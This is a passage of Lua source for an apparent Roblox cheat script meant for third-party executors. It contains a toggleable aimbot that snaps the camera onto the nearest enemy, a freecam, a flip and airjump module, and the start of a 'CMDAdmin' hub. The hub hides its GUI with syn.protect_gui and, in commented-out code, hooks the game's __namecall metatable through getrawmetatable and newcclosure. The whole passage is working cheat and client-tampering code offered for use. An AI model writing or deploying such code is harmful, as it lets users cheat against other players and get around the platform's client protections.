				and v.Character and v.Character:FindFirstChildWhichIsA("Humanoid") and v.Character:FindFirstChildWhichIsA("Humanoid").Health > 0
			then
				local allowed = not teamcheck
				if teamcheck and v.Team ~= plrsService.LocalPlayer.Team then
					allowed = true
				end

				if allowed then
					local aimobj = v.Character:FindFirstChild(trg_part) or v.Character:FindFirstChild("UpperTorso")
					if aimobj then
						if plrsService.LocalPlayer.Character:FindFirstChild("Head") then
							local ePos, vissss = workspace.CurrentCamera:WorldToViewportPoint(aimobj.Position)
							local AccPos = Vector2.new(ePos.x, ePos.y)
							local mousePos = Vector2.new(workspace.CurrentCamera.ViewportSize.x / 2, workspace.CurrentCamera.ViewportSize.y / 2)
							local distance = (AccPos - mousePos).magnitude
							if distance < last and vissss and distance < 400 then
								last = distance
								nearest = v
							end
						end
					end
				end
			end
		end
		return nearest
	end



	game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
		if not gameProcessed and input.KeyCode == Enum.KeyCode.B then
			enabled = not enabled
			if enabled == true then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Aimbot enabled",
					Text = "Key = " .. key.Name,
					Duration = 3
				})
			elseif enabled == false then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Aimbot disabled",
					Text = "Key = " .. key.Name,
					Duration = 3
				})
			end
		end
	end)

	runService.RenderStepped:Connect(function()
		local closest = getClosestPlayerToCursor(aimpart)
		if enabled and closest then
			local aimobj = closest.Character:FindFirstChild(aimpart) or closest.Character:FindFirstChild("UpperTorso") -- If not found then should be R15 Torso
			if aimobj then
				lookAt(workspace.CurrentCamera.CFrame.p, aimobj.Position)
			end
		end
	end)

end


function mod:freecam()
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	LocalScript0 = Instance.new("LocalScript")
	LocalScript0.Name = "FreeCamera"
	LocalScript0.Parent = mas
	table.insert(cors,sandbox(LocalScript0,function()
		-----------------------------------------------------------------------
		-- Freecam
		-- Cinematic free camera for spectating and video production.
		------------------------------------------------------------------------

		local pi    = math.pi
		local abs   = math.abs
		local clamp = math.clamp
		local exp   = math.exp
		local rad   = math.rad
		local sign  = math.sign
		local sqrt  = math.sqrt
		local tan   = math.tan

		local ContextActionService = game:GetService("ContextActionService")
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local StarterGui = game:GetService("StarterGui")
		local UserInputService = game:GetService("UserInputService")

		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end

		local Camera = workspace.CurrentCamera
		workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
			local newCamera = workspace.CurrentCamera
			if newCamera then
				Camera = newCamera
			end
		end)

		------------------------------------------------------------------------

		local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
		local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
		local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}

		local NAV_GAIN = Vector3.new(1, 1, 1)*64
		local PAN_GAIN = Vector2.new(0.75, 1)*8
		local FOV_GAIN = 300

		local PITCH_LIMIT = rad(90)

		local VEL_STIFFNESS = 1.5
		local PAN_STIFFNESS = 1.0
		local FOV_STIFFNESS = 4.0

		------------------------------------------------------------------------

		local Spring = {} do
			Spring.__index = Spring

			function Spring.new(freq, pos)
				local self = setmetatable({}, Spring)
				self.f = freq
				self.p = pos
				self.v = pos*0
				return self
			end

			function Spring:Update(dt, goal)
				local f = self.f*2*pi
				local p0 = self.p
				local v0 = self.v

				local offset = goal - p0
				local decay = exp(-f*dt)

				local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
				local v1 = (f*dt*(offset*f - v0) + v0)*decay

				self.p = p1
				self.v = v1

				return p1
			end

			function Spring:Reset(pos)
				self.p = pos
				self.v = pos*0
			end
		end

		------------------------------------------------------------------------

		local cameraPos = Vector3.new()
		local cameraRot = Vector2.new()
		local cameraFov = 0

		local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
		local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
		local fovSpring = Spring.new(FOV_STIFFNESS, 0)

		------------------------------------------------------------------------

		local Input = {} do
			local thumbstickCurve do
				local K_CURVATURE = 2.0
				local K_DEADZONE = 0.15

				local function fCurve(x)
					return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
				end

				local function fDeadzone(x)
					return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
				end

				function thumbstickCurve(x)
					return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
				end
			end

			local gamepad = {
				ButtonX = 0,
				ButtonY = 0,
				DPadDown = 0,
				DPadUp = 0,
				ButtonL2 = 0,
				ButtonR2 = 0,
				Thumbstick1 = Vector2.new(),
				Thumbstick2 = Vector2.new(),
			}

			local keyboard = {
				W = 0,
				A = 0,
				S = 0,
				D = 0,
				E = 0,
				Q = 0,
				U = 0,
				H = 0,
				J = 0,
				K = 0,
				I = 0,
				Y = 0,
				Up = 0,
				Down = 0,
				LeftShift = 0,
				RightShift = 0,
			}

			local mouse = {
				Delta = Vector2.new(),
				MouseWheel = 0,
			}

			local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
			local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
			local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
			local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
			local FOV_WHEEL_SPEED    = 1.0
			local FOV_GAMEPAD_SPEED  = 0.25
			local NAV_ADJ_SPEED      = 0.75
			local NAV_SHIFT_MUL      = 0.25

			local navSpeed = 1

			function Input.Vel(dt)
				navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

				local kGamepad = Vector3.new(
					thumbstickCurve(gamepad.Thumbstick1.x),
					thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
					thumbstickCurve(-gamepad.Thumbstick1.y)
				)*NAV_GAMEPAD_SPEED

				local kKeyboard = Vector3.new(
					keyboard.D - keyboard.A + keyboard.K - keyboard.H,
					keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
					keyboard.S - keyboard.W + keyboard.J - keyboard.U
				)*NAV_KEYBOARD_SPEED

				local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

				return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
			end

			function Input.Pan(dt)
				local kGamepad = Vector2.new(
					thumbstickCurve(gamepad.Thumbstick2.y),
					thumbstickCurve(-gamepad.Thumbstick2.x)
				)*PAN_GAMEPAD_SPEED
				local kMouse = mouse.Delta*PAN_MOUSE_SPEED
				mouse.Delta = Vector2.new()
				return kGamepad + kMouse
			end

			function Input.Fov(dt)
				local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
				local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
				mouse.MouseWheel = 0
				return kGamepad + kMouse
			end

			do
				local function Keypress(action, state, input)
					keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
					return Enum.ContextActionResult.Sink
				end

				local function GpButton(action, state, input)
					gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
					return Enum.ContextActionResult.Sink
				end

				local function MousePan(action, state, input)
					local delta = input.Delta
					mouse.Delta = Vector2.new(-delta.y, -delta.x)
					return Enum.ContextActionResult.Sink
				end

				local function Thumb(action, state, input)
					gamepad[input.KeyCode.Name] = input.Position
					return Enum.ContextActionResult.Sink
				end

				local function Trigger(action, state, input)
					gamepad[input.KeyCode.Name] = input.Position.z
					return Enum.ContextActionResult.Sink
				end

				local function MouseWheel(action, state, input)
					mouse[input.UserInputType.Name] = -input.Position.z
					return Enum.ContextActionResult.Sink
				end

				local function Zero(t)
					for k, v in pairs(t) do
						t[k] = v*0
					end
				end

				function Input.StartCapture()
					ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
						Enum.KeyCode.W, Enum.KeyCode.U,
						Enum.KeyCode.A, Enum.KeyCode.H,
						Enum.KeyCode.S, Enum.KeyCode.J,
						Enum.KeyCode.D, Enum.KeyCode.K,
						Enum.KeyCode.E, Enum.KeyCode.I,
						Enum.KeyCode.Q, Enum.KeyCode.Y,
						Enum.KeyCode.Up, Enum.KeyCode.Down
					)
					ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
					ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
					ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
					ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
					ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
				end

				function Input.StopCapture()
					navSpeed = 1
					Zero(gamepad)
					Zero(keyboard)
					Zero(mouse)
					ContextActionService:UnbindAction("FreecamKeyboard")
					ContextActionService:UnbindAction("FreecamMousePan")
					ContextActionService:UnbindAction("FreecamMouseWheel")
					ContextActionService:UnbindAction("FreecamGamepadButton")
					ContextActionService:UnbindAction("FreecamGamepadTrigger")
					ContextActionService:UnbindAction("FreecamGamepadThumbstick")
				end
			end
		end

		local function GetFocusDistance(cameraFrame)
			local znear = 0.1
			local viewport = Camera.ViewportSize
			local projy = 2*tan(cameraFov/2)
			local projx = viewport.x/viewport.y*projy
			local fx = cameraFrame.rightVector
			local fy = cameraFrame.upVector
			local fz = cameraFrame.lookVector

			local minVect = Vector3.new()
			local minDist = 512

			for x = 0, 1, 0.5 do
				for y = 0, 1, 0.5 do
					local cx = (x - 0.5)*projx
					local cy = (y - 0.5)*projy
					local offset = fx*cx - fy*cy + fz
					local origin = cameraFrame.p + offset*znear
					local part, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
					local dist = (hit - origin).magnitude
					if minDist > dist then
						minDist = dist
						minVect = offset.unit
					end
				end
			end

			return fz:Dot(minVect)*minDist
		end

		------------------------------------------------------------------------

		local function StepFreecam(dt)
			local vel = velSpring:Update(dt, Input.Vel(dt))
			local pan = panSpring:Update(dt, Input.Pan(dt))
			local fov = fovSpring:Update(dt, Input.Fov(dt))

			local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

			cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
			cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
			cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

			local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
			cameraPos = cameraCFrame.p

			Camera.CFrame = cameraCFrame
			Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
			Camera.FieldOfView = cameraFov
		end

		------------------------------------------------------------------------

		local PlayerState = {} do
			local mouseIconEnabled
			local cameraSubject
			local cameraType
			local cameraFocus
			local cameraCFrame
			local cameraFieldOfView
			local screenGuis = {}
			local coreGuis = {
				Backpack = true,
				Chat = true,
				Health = true,
				PlayerList = true,
			}
			local setCores = {
				BadgesNotificationsActive = true,
				PointsNotificationsActive = true,
			}

			-- Save state and set up for freecam
			function PlayerState.Push()
				for name in pairs(coreGuis) do
					coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
					StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
				end
				for name in pairs(setCores) do
					setCores[name] = StarterGui:GetCore(name)
					StarterGui:SetCore(name, false)
				end
				local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
				if playergui then
					for _, gui in pairs(playergui:GetChildren()) do
						if gui:IsA("ScreenGui") and gui.Enabled then
							screenGuis[#screenGuis + 1] = gui
							gui.Enabled = false
						end
					end
				end

				cameraFieldOfView = Camera.FieldOfView
				Camera.FieldOfView = 70

				cameraType = Camera.CameraType
				Camera.CameraType = Enum.CameraType.Custom

				cameraSubject = Camera.CameraSubject
				Camera.CameraSubject = nil

				cameraCFrame = Camera.CFrame
				cameraFocus = Camera.Focus

				mouseIconEnabled = UserInputService.MouseIconEnabled
				UserInputService.MouseIconEnabled = false

				mouseBehavior = UserInputService.MouseBehavior
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			end

			-- Restore state
			function PlayerState.Pop()
				for name, isEnabled in pairs(coreGuis) do
					StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
				end
				for name, isEnabled in pairs(setCores) do
					StarterGui:SetCore(name, isEnabled)
				end
				for _, gui in pairs(screenGuis) do
					if gui.Parent then
						gui.Enabled = true
					end
				end

				Camera.FieldOfView = cameraFieldOfView
				cameraFieldOfView = nil

				Camera.CameraType = cameraType
				cameraType = nil

				Camera.CameraSubject = cameraSubject
				cameraSubject = nil

				Camera.CFrame = cameraCFrame
				cameraCFrame = nil

				Camera.Focus = cameraFocus
				cameraFocus = nil

				UserInputService.MouseIconEnabled = mouseIconEnabled
				mouseIconEnabled = nil

				UserInputService.MouseBehavior = mouseBehavior
				mouseBehavior = nil
			end
		end

		local function StartFreecam()
			local cameraCFrame = Camera.CFrame
			cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
			cameraPos = cameraCFrame.p
			cameraFov = Camera.FieldOfView

			velSpring:Reset(Vector3.new())
			panSpring:Reset(Vector2.new())
			fovSpring:Reset(0)

			PlayerState.Push()
			RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
			Input.StartCapture()
		end

		local function StopFreecam()
			Input.StopCapture()
			RunService:UnbindFromRenderStep("Freecam")
			PlayerState.Pop()
		end

		------------------------------------------------------------------------

		do
			local enabled = false

			local function ToggleFreecam()
				if enabled then
					StopFreecam()
				else
					StartFreecam()
				end
				enabled = not enabled
			end

			local function CheckMacro(macro)
				for i = 1, #macro - 1 do
					if not UserInputService:IsKeyDown(macro[i]) then
						return
					end
				end
				ToggleFreecam()
			end

			local function HandleActivationInput(action, state, input)
				if state == Enum.UserInputState.Begin then
					if input.KeyCode == FREECAM_MACRO_KB[#FREECAM_MACRO_KB] then
						CheckMacro(FREECAM_MACRO_KB)
					end
				end
				return Enum.ContextActionResult.Pass
			end

			ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB[#FREECAM_MACRO_KB])
		end
	end))
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end


function mod:backflip()
	wait(5)

	--[[ Info ]]--

	local ver = "2.00"
	local scriptname = "feFlip"


	--[[ Keybinds ]]--

	local FrontflipKey = Enum.KeyCode.Z
	local BackflipKey = Enum.KeyCode.X
	local AirjumpKey = Enum.KeyCode.C


	--[[ Dependencies ]]--

	local ca = game:GetService("ContextActionService")
	local zeezy = game:GetService("Players").LocalPlayer
	local h = 0.0174533
	local antigrav


	--[[ Functions ]]--

	function zeezyFrontflip(act,inp,obj)
		if inp == Enum.UserInputState.Begin then
			zeezy.Character.Humanoid:ChangeState("Jumping")
			wait()
			zeezy.Character.Humanoid.Sit = true
			for i = 1,360 do 
				delay(i/720,function()
					zeezy.Character.Humanoid.Sit = true
					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
				end)
			end
			wait(0.55)
			zeezy.Character.Humanoid.Sit = false
		end
	end

	function zeezyBackflip(act,inp,obj)
		if inp == Enum.UserInputState.Begin then
			zeezy.Character.Humanoid:ChangeState("Jumping")
			wait()
			zeezy.Character.Humanoid.Sit = true
			for i = 1,360 do
				delay(i/720,function()
					zeezy.Character.Humanoid.Sit = true
					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
				end)
			end
			wait(0.55)
			zeezy.Character.Humanoid.Sit = false
		end
	end

	function zeezyAirjump(act,inp,obj)
		if inp == Enum.UserInputState.Begin then
			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
			wait()
			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
		end
	end


	--[[ Binds ]]--

	ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
	ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
	ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)

	--[[ Load Message ]]--

	print(scriptname .. " " .. ver .. " loaded successfully")
	print("made by Zeezy#7203")

	local notifSound = Instance.new("Sound",workspace)
	notifSound.PlaybackSpeed = 1.5
	notifSound.Volume = 0.15
	notifSound.SoundId = "rbxassetid://170765130"
	notifSound.PlayOnRemove = true
	notifSound:Destroy()
	game.StarterGui:SetCore("SendNotification", {Title = "feFlip", Text = "feFlip loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
end















function mod:CMDAdmin()
	---------------------------------------|
	while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end
	-- Constraints: -----------------------|
	local ver = "1.9.9f"
	local cordCode = "https://discord.gg/JyzvQ6zdfg"
	---------------------------------------|
	Parents = {[1] = game:GetService("Players").LocalPlayer.PlayerGui, [2] = game:GetService("Players").LocalPlayer.PlayerGui, [3] = game:GetService("Players").LocalPlayer.PlayerGui}
	if Parents[1] then
		getParent = Parents[1]
	else
		getParent = Parents[2]
	end


	local firetouchinterest = function() return end

	for _, v in pairs(Parents[1]:GetDescendants()) do
		if v.Name == "holder" then 
			v.Parent:Destroy() 
		end
	end
	for _, v in pairs(Parents[2]:GetDescendants()) do
		if v.Name == "holder" then 
			v.Parent:Destroy() 
		end
	end

	Unnamed = Instance.new("ScreenGui", getParent)
	Unnamed.Name = "Unnamed"
	Unnamed.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Unnamed.ResetOnSpawn = false
	Unnamed.DisplayOrder = 2147483647
	if not syn then syn = {} end
	if not syn.queue_on_teleport then syn.queue_on_teleport = queue_on_teleport end
	if not is_sirhurt_closure and syn.protect_gui then syn.protect_gui(Unnamed) end

	sgui = Instance.new("ScreenGui", Unnamed)
	sgui.IgnoreGuiInset = true
	local function Draw(positionsent, line, thickness)
		local positions = {
			[1] = positionsent and positionsent[1] and UDim2.new(0, positionsent[1].X, 0, positionsent[1].Y) or UDim2.new(0, 0, 0, 0),
			[2] = positionsent and positionsent[2] and UDim2.new(0, positionsent[2].X, 0, positionsent[2].Y) or UDim2.new(0, 0, 0, 0)
		}
		local distances = {
			X = positions[2].X.Offset - positions[1].X.Offset,
			Y = positions[2].Y.Offset - positions[1].Y.Offset
		}
		local distance = (distances.X ^ 2 + distances.Y ^ 2) ^ .5
		local angle = math.atan2(distances.Y, distances.X)
		line.Size = UDim2.new(0, distance, 0, thickness)
		local center = Vector2.new(
			(positions[1].X.Offset + positions[2].X.Offset) / 2,
			(positions[1].Y.Offset + positions[2].Y.Offset) / 2
		)
		line.Position = UDim2.new(0, center.X - distance / 2, 0, center.Y - thickness / 2)
		line.Rotation = math.deg(angle)
		line.BorderSizePixel = 0
		return line
	end

	oldDrawing = Drawing
	newDrawing = {new = function(DrawingType)
		if DrawingType == "Line" then 
			local line = {}
			local line_object = Instance.new("Frame", sgui)
			line_object.ZIndex = 3000
			return setmetatable({},{
				__index = function(self,key)
					if key == "Remove" then
						line_object:Destroy()
						return function() end
					end
				end,
				__newindex = function(self,key,value)
					local thickness = 1
					if key == "Visible" then
						line_object.Visible = value
					elseif key == "From" or key == "To" then
						line[key] = value
					elseif key == "Thickness" then
						thickness = value
					end
					Draw({line.From, line.To}, line_object, thickness * 2)
				end
			})
		elseif DrawingType == "Circle" then
			local circle = {}
			local circle_object = Instance.new("Frame",Parent)
			circle_object.BorderSizePixel = 0
			circle_object.AnchorPoint = Vector2.new(0.5, 0.5)
			Instance.new("UICorner",circle_object).CornerRadius = UDim.new(1,0)
			return setmetatable({},{
				__index = function(self,key)
					if key == "Remove" then
						return function() circle_object:Destroy() end
					end
				end,
				__newindex = function(self,key,value)
					if key == "Visible" then
						circle_object.Visible = value
					elseif key == "Color" then
						circle_object.BackgroundColor3 = value
					elseif key == "Position" then
						circle_object.Position = UDim2.new(0, value.X, 0, value.Y)
					elseif key == "Radius" then
						circle_object.Size = UDim2.new(0, value * 2, 0, value * 2)
					end
				end
			})
		elseif DrawingType == "Text" then
			local text = {}
			local text_object = Instance.new("TextLabel",Parent)
			text_object.BorderSizePixel = 0
			text_object.AnchorPoint = Vector2.new(0.5, 0.5)
			return setmetatable({},{
				__index = function(self,key)
					if key == "Remove" then
						return function() text_object:Destroy() end
					end
				end,
				__newindex = function(self,key,value)
					if key == "Visible" then
						text_object.Visible = value
					elseif key == "Color" then
						text_object.TextColor3 = value
					elseif key == "Position" then
						text_object.Position = UDim2.new(0,value.X,0,value.Y)
					elseif key == "Size" then
						text_object.TextSize = value
					elseif key == "Text" then
						text_object.Text = value
					end
				end
			})
		elseif DrawingType == "Square" then
			local box = {}
			local box_object = Instance.new("Frame",Parent)
			box_object.BorderSizePixel = 0
			box_object.AnchorPoint = Vector2.new(0.5, 0.5)
			return setmetatable({},{
				__index = function(self,key)
					if key == "Remove" then
						return function() box_object:Destroy() end
					end
				end,
				__newindex = function(self,key,value)
					if key == "Visible" then
						box_object.Visible = value
					elseif key == "Color" then
						box_object.BackgroundColor3 = value
					elseif key == "Position" then
						box_object.Position = UDim2.new(0,value.X,0,value.Y)
					elseif key == "Size" then
						box_object.Size = UDim2.new(0,value.X,0,value.Y)
					end
				end
			})
		end
	end}




	_G.Unnamed = Unnamed
	_G.dontTween = false
	_G.dragVars = {}
	_G.connections = {}

	function createDrag(object)
		_G.dragVars[object] = {}
		object.MouseEnter:Connect(function()
			_G.dragVars[object].checkMouse = true
			_G.dragVars[object].mdwn = object.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					_G.dragVars[object].startpos = object.Position
					_G.dragVars[object].startdrag = input.Position
					_G.dragVars[object].mouseDown = true
					_G.dragVars[object].mou = input
					_G.dragVars[object].mloo = game:GetService("RunService").RenderStepped:Connect(function()
						if _G.dragVars[object].mouseDown then
							_G.dragVars[object].delta = _G.dragVars[object].mou.Position - _G.dragVars[object].startdrag
							object.Position = UDim2.new(_G.dragVars[object].startpos.X.Scale, _G.dragVars[object].startpos.X.Offset + _G.dragVars[object].delta.X, _G.dragVars[object].startpos.Y.Scale, _G.dragVars[object].startpos.Y.Offset + _G.dragVars[object].delta.Y)
						end
					end)
				end
			end) 
			_G.dragVars[object].mmoved = object.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					_G.dragVars[object].mou = input
				end
			end) 
			object.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					_G.dragVars[object].mouseDown = false
					_G.dragVars[object].mmoved:Disconnect()
					if _G.dragVars[object].mloo then _G.dragVars[object].mloo:Disconnect() end
				end    
			end)
		end)
		object.MouseLeave:Connect(function()
			if _G.dragVars[object].mdwn then
				_G.dragVars[object].mdwn:Disconnect()
			end
		end)
	end

	function Stand(Text1,Text2,Text3,Text4,Text5,Text6,Btn)
		if game:GetService("UserInputService").VREnabled then 
			RunDude = true
			return 
		end
		RunDude = false
		LoadingFrame = Instance.new("Frame", getParent)
		RandomReason = Instance.new("TextLabel", getParent)
		RunQuestion = Instance.new("TextLabel", getParent)
		Executors = Instance.new("TextLabel", getParent)
		Paid = Instance.new("TextLabel", getParent)
		Free = Instance.new("TextLabel", getParent)
		Help = Instance.new("TextLabel", getParent)
		HmmButton = Instance.new("TextButton", getParent)

		LoadingFrame.Name = "LoadingFrame"
		LoadingFrame.Parent = Unnamed
		LoadingFrame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
		LoadingFrame.BackgroundTransparency = 0.100
		LoadingFrame.Position = UDim2.new(-9.31322575e-10, 0, -0.101388887, 0)
		LoadingFrame.Size = UDim2.new(1, 0, 1.20000005, 0)

		RandomReason.Name = "Random/Reason"
		RandomReason.Parent = LoadingFrame
		RandomReason.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		RandomReason.BackgroundTransparency = 1.000
		RandomReason.Position = UDim2.new(0.489562511, 0, 0.335111082, 0)
		RandomReason.Size = UDim2.new(0.0199999996, 0, 0.0500000007, 0)
		RandomReason.Font = Enum.Font.GothamBold
		RandomReason.Text = Text1
		RandomReason.TextColor3 = Color3.fromRGB(255, 255, 255)
		RandomReason.TextSize = 50.000

		RunQuestion.Name = "RunQuestion"
		RunQuestion.Parent = LoadingFrame
		RunQuestion.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		RunQuestion.BackgroundTransparency = 1.000
		RunQuestion.Position = UDim2.new(0.489562511, 0, 0.383953691, 0)
		RunQuestion.Size = UDim2.new(0.0199999996, 0, 0.0500000007, 0)
		RunQuestion.Font = Enum.Font.GothamBold
		RunQuestion.Text = Text2
		RunQuestion.TextColor3 = Color3.fromRGB(255, 255, 255)
		RunQuestion.TextSize = 25.000

		Executors.Name = "Executors"
		Executors.Parent = LoadingFrame
		Executors.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Executors.BackgroundTransparency = 1.000
		Executors.Position = UDim2.new(0.492968768, 0, 0.474129587, 0)
		Executors.Size = UDim2.new(0.0130000003, 0, 0.0500000007, 0)
		Executors.Font = Enum.Font.GothamBold
		Executors.Text = Text3
		Executors.TextColor3 = Color3.fromRGB(255, 255, 255)
		Executors.TextSize = 20.000

		Paid.Name = "Paid"
		Paid.Parent = LoadingFrame
		Paid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Paid.BackgroundTransparency = 1.000
		Paid.Position = UDim2.new(0.492968738, 0, 0.496083349, 0)
		Paid.Size = UDim2.new(0.0130000003, 0, 0.0500000007, 0)
		Paid.Font = Enum.Font.GothamBold
		Paid.Text = Text4
		Paid.TextColor3 = Color3.fromRGB(255, 255, 255)
		Paid.TextSize = 17.000

		Help.Name = "Help"
		Help.Parent = LoadingFrame
		Help.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Help.BackgroundTransparency = 1.000
		Help.Position = UDim2.new(0.492968738, 0, 0.66259259, 0)
		Help.Size = UDim2.new(0.0130000003, 0, 0.0500000007, 0)
		Help.Font = Enum.Font.GothamBold
		Help.Text = "Need help? "..cordCode
		Help.TextColor3 = Color3.fromRGB(255, 255, 255)
		Help.TextSize = 20.000

		HmmButton.Name = "HmmButton"
		HmmButton.Parent = LoadingFrame
		HmmButton.BackgroundColor3 = Color3.fromRGB(93, 93, 93)
		HmmButton.BackgroundTransparency = 0.700
		HmmButton.BorderColor3 = Color3.fromRGB(53, 51, 51)
		HmmButton.BorderSizePixel = 0
		HmmButton.Position = UDim2.new(0.424718767, 0, 0.582555592, 0)
		HmmButton.Size = UDim2.new(0.150000006, 0, 0.0500000007, 0)
		HmmButton.Font = Enum.Font.GothamBold
		HmmButton.Text = Text6
		HmmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		HmmButton.TextSize = 30.000
		HmmButton.Visible = Btn
		HmmButton.MouseButton1Down:Connect(function()
			LoadingFrame:Destroy()
			RunDude = true
		end)

		Free.Name = "Free"
		Free.Parent = LoadingFrame
		Free.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Free.BackgroundTransparency = 1.000
		Free.Position = UDim2.new(0.492968738, 0, 0.514601827, 0)
		Free.Size = UDim2.new(0.0130000003, 0, 0.0500000007, 0)
		Free.Font = Enum.Font.GothamBold
		Free.Text = Text5
		Free.TextColor3 = Color3.fromRGB(255, 255, 255)
		Free.TextSize = 17.000
	end

	local cmdp = game:GetService("Players")
	local cmdlp = cmdp.LocalPlayer
--[[local cg = game:GetService("CoreGui")
for i,v in pairs(cg:GetChildren()) do
	if v:IsA("Sound") and v.Volume == 2 and v.Name:sub(16, 16) == "4" then
		v:Destroy()
		Stand("Looks like Infinite Yield has something to say.","We have no problem with you using both products","", "We have deleted their text-to-speech message for your convenience","We don't know where such a message is coming from. Please don't show any disrespect to ZWolf or Edge, they had nothing to do with it to my knowledge. -fini","Continue", true)
		while not RunDude do wait() end
	end
end
local mt = getrawmetatable(game:GetService("CoreGui"))
local namecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
	if checkcaller() and IY_LOADED and getnamecallmethod() == "Play" and string.sub(tostring(self), 16, 16) == "4" and typeof(self) == "Instance" then
